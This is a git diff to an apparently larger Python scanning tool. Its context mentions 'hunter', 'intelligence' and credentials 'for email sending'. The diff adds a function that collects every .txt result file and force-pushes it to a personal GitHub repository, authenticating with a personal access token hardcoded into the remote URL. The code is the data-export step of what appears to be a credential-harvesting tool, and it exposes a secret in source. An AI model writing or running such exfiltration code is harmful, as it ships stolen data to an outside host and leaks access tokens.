@@ -2869,6 +2869,9 @@ You can use these credentials for email sending.
         except Exception as e:
             self.logger.error(f"Error saving intelligence: {e}")
             
+        # Push vers GitHub
+        push_results_to_github()
+
         # Stats finales
         self.print_final_comprehensive_stats()
         
@@ -2945,6 +2948,65 @@ You can use these credentials for email sending.
 
 
 # ==================== FONCTIONS UTILITAIRES ====================
+
+def push_results_to_github():
+    """🔁 Push automatique des résultats vers GitHub"""
+    try:
+        import subprocess
+        import shutil
+        from datetime import datetime
+        
+        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        output_folder = "."
+        repo_dir = f"/tmp/github_upload_{timestamp}"
+        
+        os.makedirs(repo_dir, exist_ok=True)
+        print(f"📁 Copying files to {repo_dir}")
+        
+        files_copied = 0
+        for file in os.listdir(output_folder):
+            if file.endswith(".txt"):
+                shutil.copy(os.path.join(output_folder, file), os.path.join(repo_dir, file))
+                files_copied += 1
+                print(f"📄 Copied: {file}")
+        
+        if files_copied == 0:
+            print("⚠️ No .txt files found to upload")
+            return False
+        
+        GITHUB_TOKEN = "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"
+        GITHUB_REPO = f"https://{GITHUB_TOKEN}@github.com/mehdi28777/data.git"
+        COMMIT_MESSAGE = f"Résultats scan {timestamp} - {files_copied} fichiers"
+        
+        print(f"🚀 Pushing {files_copied} files to GitHub...")
+        
+        os.chdir(repo_dir)
+        
+        commands = [
+            ["git", "init"],
+            ["git", "config", "user.name", "mehdi28777"],
+            ["git", "config", "user.email", "mehdi28777@github.com"],
+            ["git", "add", "."],
+            ["git", "commit", "-m", COMMIT_MESSAGE],
+            ["git", "branch", "-M", "main"],
+            ["git", "remote", "add", "origin", GITHUB_REPO],
+            ["git", "push", "--force", "-u", "origin", "main"]
+        ]
+        
+        for cmd in commands:
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            if result.returncode != 0:
+                print(f"❌ Error executing: {' '.join(cmd)}")
+                print(f"Error: {result.stderr}")
+                return False
+        
+        print(f"✅ Successfully pushed {files_copied} files to GitHub!")
+        shutil.rmtree(repo_dir, ignore_errors=True)
+        return True
+        
+    except Exception as e:
+        print(f"❌ Error pushing to GitHub: {e}")
+        return False
 
 def setup_signal_handlers(hunter):
     """⚡ Configuration gestionnaires de signaux"""
